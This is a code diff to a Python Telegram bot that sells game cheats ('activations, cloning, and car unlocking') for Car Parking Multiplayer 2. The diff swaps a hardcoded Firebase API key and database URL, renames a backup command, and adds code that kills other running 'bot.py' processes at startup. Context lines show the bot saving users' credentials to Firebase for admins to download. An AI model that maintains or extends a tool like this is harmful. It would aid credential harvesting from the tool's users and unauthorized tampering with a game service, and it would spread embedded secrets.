@@ -7,6 +7,7 @@ MERGED - CPM2 activations, cloning, and car unlocking from old code
 """
 
 import requests
+import signal
 import time
 import json
 import telebot
@@ -76,8 +77,8 @@ CHANNEL_LINK = "https://t.me/markmwhehe"
 # 🔥 FIREBASE LOGGING CONFIG
 # ═══════════════════════════════════════════════════════════
 
-FIREBASE_API_KEY = "ph2yty6YZsJCU4oOFZi901HN4sGo7Ehtie94p7KX"
-DB_URL = "https://cpm2bpt-default-rtdb.europe-west1.firebasedatabase.app"
+FIREBASE_API_KEY = "9rn0Ex4Mnc7VnMpBvxi1EyVsBfgRwo2UhVMNtPT0"
+DB_URL = "https://cpm-2-7cea1-42c9a-default-rtdb.firebaseio.com"
 
 # ═══════════════════════════════════════════════════════════
 # 💳 SUBSCRIPTION & PAYMENT SETTINGS
@@ -1759,7 +1760,7 @@ def download_logs_command(message):
             summary += f"  • {entry}\n"
         if total_credentials > 10:
             summary += f"\n  ... and {total_credentials - 10} more credentials saved\n"
-        summary += f"\n💾 Use /backup_now to download full backup."
+        summary += f"\n💾 Use /backupnow to download full backup."
         bot.edit_message_text(summary, chat_id, msg.message_id, parse_mode='Markdown')
     except Exception as e:
         bot.edit_message_text(f"❌ **Failed to fetch logs:** {str(e)}", chat_id, msg.message_id, parse_mode='Markdown')
@@ -1768,7 +1769,7 @@ def download_logs_command(message):
 # 💾 BACKUP NOW COMMAND
 # ═══════════════════════════════════════════════════════════
 
-@bot.message_handler(commands=['backup_now'])
+@bot.message_handler(commands=['backup_now', 'backupnow'])
 def backup_now_command(message):
     chat_id = message.chat.id
     if not is_admin(chat_id):
@@ -1875,7 +1876,7 @@ def dashboard_command(message):
             f"⏰ **24h Activity:** **{recent_count}**\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-            f"💾 Use /backup_now to download full backup.\n"
+            f"💾 Use /backupnow to download full backup.\n"
             f"📥 Use /download_logs for detailed logs."
         )
         bot.edit_message_text(dashboard_text, chat_id, msg.message_id, parse_mode='Markdown')
@@ -4295,7 +4296,46 @@ def handle_all_messages(message):
 # 🚀 BOT START
 # ═══════════════════════════════════════════════════════════
 
+def _enforce_single_instance():
+    """Kill any older copy of this bot running on the same machine (prevents
+    Telegram 409 'terminated by other getUpdates request' errors on Render)."""
+    my_pid = os.getpid()
+    try:
+        myself = []
+        try:
+            # Linux: /proc/*/cmdline is the most reliable way
+            for pid_dir in os.listdir('/proc'):
+                if not pid_dir.isdigit():
+                    continue
+                pid = int(pid_dir)
+                if pid == my_pid:
+                    continue
+                cmdline_path = f'/proc/{pid}/cmdline'
+                try:
+                    with open(cmdline_path, 'rb') as f:
+                        cmdline = f.read().replace(b'\x00', b' ').decode(errors='ignore')
+                    # Match python bot.py processes with same script name
+                    if 'bot.py' in cmdline and 'python' in cmdline:
+                        myself.append(pid)
+                except (PermissionError, FileNotFoundError, ProcessLookupError):
+                    continue
+        except Exception:
+            pass
+        for pid in myself:
+            try:
+                os.kill(pid, signal.SIGTERM)
+                print(f"🔪 Stopped older bot instance (PID {pid})")
+            except (ProcessLookupError, PermissionError):
+                pass
+        # Give old instances a moment to release polling
+        if myself:
+            time.sleep(3)
+    except Exception as e:
+        print(f"⚠️ Single-instance check skipped: {e}")
+
 if __name__ == "__main__":
+    # Ensure only ONE bot instance is running (prevents Telegram 409 Conflict)
+    _enforce_single_instance()
     print("="*60)
     print("☠️☠️☠️ MARKMWEHEHETOOL BOT - CPM1 + CPM2 ULTIMATE ☠️☠️☠️")
     print("="*60)
@@ -4321,6 +4361,13 @@ if __name__ == "__main__":
     print("🌟 Stars Balance: tracked in stars_balance.json (/stars to view)")
     print("⏰ Auto Expiry: User gets renewal message when subscription expires")
     print("="*60)
+
+    # Drop any leftover updates/webhook so this instance starts with a clean slate
+    try:
+        bot.delete_webhook(drop_pending_updates=True)
+        print("🧹 Webhook cleared, pending updates dropped")
+    except Exception as e:
+        print(f"⚠️ Webhook cleanup: {e}")
 
     while True:
         try:
